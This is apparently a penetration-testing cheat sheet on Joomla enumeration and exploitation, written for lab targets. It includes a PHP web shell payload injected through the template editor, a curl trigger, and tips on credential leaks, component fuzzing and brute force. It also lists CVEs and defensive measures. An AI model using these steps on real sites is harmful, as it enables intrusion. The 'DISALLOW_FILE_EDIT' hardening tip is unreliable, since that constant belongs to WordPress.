
# Joomla - Enumeration & Exploitation

## 🧠 Overview

Joomla is a versatile and widely used CMS. For a pentester, Joomla's main weaknesses usually lie in **outdated cores**, **insecure 3rd-party extensions**, and the **powerful built-in template editor** that allows direct PHP execution once administrative access is gained.

---

## 🔍 Discovery & Footprinting

### 🧪 Manual Fingerprinting

Joomla is easy to identify via `robots.txt` or specific metadata in the HTML source:

* **Header:** `X-Content-Encoded-By: Joomla! 2.5`
* **Meta Tag:** `<meta name="generator" content="Joomla! - Open Source Content Management" />`
* **Paths:** Presence of `/administrator/`, `/components/`, or `/modules/`.

### 🧪 Version Detection

Knowing the exact version is critical for matching CVEs.

* **Manifest file:** `curl -s http://target.htb/administrator/manifests/files/joomla.xml`
* **Language files:** Check `/language/en-GB/en-GB.xml`.

---

## 🔍 Automated Enumeration

### 🛠️ Droopescan

A multi-CMS scanner that is very effective for identifying themes and plugins.

```bash
droopescan scan joomla --url http://target.htb/

```

### 🛠️ JoomScan (OWASP Joomla Vulnerability Scanner)

The industry standard for Joomla. It finds vulnerabilities and firewall bypasses.

```bash
# Installation (example on Kali)
sudo apt install joomscan

# Usage
joomscan -u http://target.htb

```

---

## 💥 Authenticated Exploitation (RCE)

The most reliable way to get a shell on Joomla once you have admin credentials is through the **Template Manager**.

### 🚀 Exploitation Flow: Template Web Shell

1. **Navigate:** Login to `/administrator` -> `Extensions` -> `Templates` -> `Templates`.
2. **Select:** Click on a template (e.g., **Protostar** or **Beez3**).
3. **Inject:** Select `error.php` or `index.php` from the file list.
4. **Code:** Add your payload:
```php
<?php system($_GET['cmd']); ?>

```


5. **Trigger:** Access the modified file:
`curl http://target.htb/templates/protostar/error.php?cmd=id`

---

## 🔥 Public Vulnerabilities (CVEs)

Joomla has had several critical bugs that allow RCE or information disclosure without credentials.

| CVE | Vulnerability | Impact |
| --- | --- | --- |
| **CVE-2015-8562** | Object Deserialization | **Pre-Auth RCE** via User-Agent |
| **CVE-2017-8917** | SQL Injection | **Pre-Auth SQLi** (com_fields) |
| **CVE-2019-10945** | Directory Traversal | Authenticated file disclosure/deletion |
| **CVE-2023-23752** | Improper Auth | **Pre-Auth Info Leak** (API endpoints) |

---

## 🛡️ Defensive Measures

1. **Rename the Admin Directory:** Use extensions to change `/administrator` to a custom path to prevent automated brute force.
2. **Update Core:** Joomla 4.x/5.x have significant security improvements over the 3.x branch.
3. **Disable Template Editing:** Add `define('DISALLOW_FILE_EDIT', true);` or use filesystem permissions to prevent PHP modification from the UI.
4. **Strong Credentials:** Use MFA (Multi-Factor Authentication) which is supported natively in modern Joomla versions.

---

## 💣 Pentester Mindset

* **The "Configuration" Leak:** If you have LFI (Local File Inclusion), always aim for `configuration.php`. It contains the database credentials in plaintext.
* **Component Fuzzing:** Most Joomla vulnerabilities are in 3rd-party components (`com_something`). Use a wordlist to find installed components: `/index.php?option=com_FUZZ`.
* **Admin Brute Force:** Joomla does not have built-in rate limiting for the admin panel by default. If MFA is off, brute force is highly effective.
